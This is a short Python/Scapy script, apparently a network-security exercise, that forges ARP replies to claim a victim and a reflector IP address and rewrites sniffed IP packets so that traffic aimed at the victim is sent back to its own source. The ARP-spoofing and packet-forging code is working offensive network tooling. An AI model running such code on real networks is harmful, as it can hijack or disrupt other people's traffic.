#!/usr/bin/env python3
import argparse
from scapy.all import *

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('--interface', dest='iface')
    parser.add_argument('--victim-ip', dest='vicip')
    parser.add_argument('--victim-ethernet', dest='viceth')
    parser.add_argument('--reflector-ip', dest='refip')
    parser.add_argument('--reflector-ethernet', dest='refeth')
    args = parser.parse_args()
    # iface = args.iface
    # vicip = args.vicip
    # viceth = args.viceth
    # refip = args.refip
    # refeth = args.refeth
    return args

def sniffer(iface):
    sniff(iface=iface, prn=process_packet, count=0)

def process_packet(pkt):
    if ARP in pkt:
        if (pkt[ARP].pdst) == args.vicip:
            print('[+] Arp request for Victim')
            vic_arpreply=ARP(psrc = args.vicip, pdst = pkt[ARP].psrc, op=2, hwsrc = args.viceth, hwdst='ff:ff:ff:ff:ff:ff')
            send(vic_arpreply)
        if (pkt[ARP].pdst) == args.refip:
            print('[+] Arp request for Reflector')
            ref_arpreply=ARP(psrc = args.refip, pdst = pkt[ARP].psrc, op=2, hwsrc = args.refeth, hwdst='ff:ff:ff:ff:ff:ff')
            send(ref_arpreply)

    elif IP in pkt:
        if (pkt[IP].dst) == args.vicip:    #When the attacer tries to talk to Victim,
            resent_pkt = pkt.getlayer(IP)
            resent_pkt[IP].src, resent_pkt[IP].dst = args.refip, pkt[IP].src           
            print("[+] Sending from Reflector")
            del resent_pkt[IP].chksum
            if TCP in resent_pkt:
                del resent_pkt[TCP].chksum
            if UDP in resent_pkt:
                del resent_pkt[UDP].chksum
            send(resent_pkt)                # The reflector replay the attack to the attacker
        
        if (pkt[IP].dst) == args.refip:    #When the attacker responds to the reflctor,
            resent_pkt = pkt.getlayer(IP)
            resent_pkt[IP].src, resent_pkt[IP].dst = args.vicip, pkt[IP].src
            print("[+] Sending from Victim")
            del resent_pkt[IP].chksum
            if TCP in resent_pkt:
                del resent_pkt[TCP].chksum
            if UDP in resent_pkt:
                del resent_pkt[UDP].chksum
            send(resent_pkt)                # The reflector makes the victim send the response of attacking the attacker             


args = get_arguments()
sniffer(args.iface)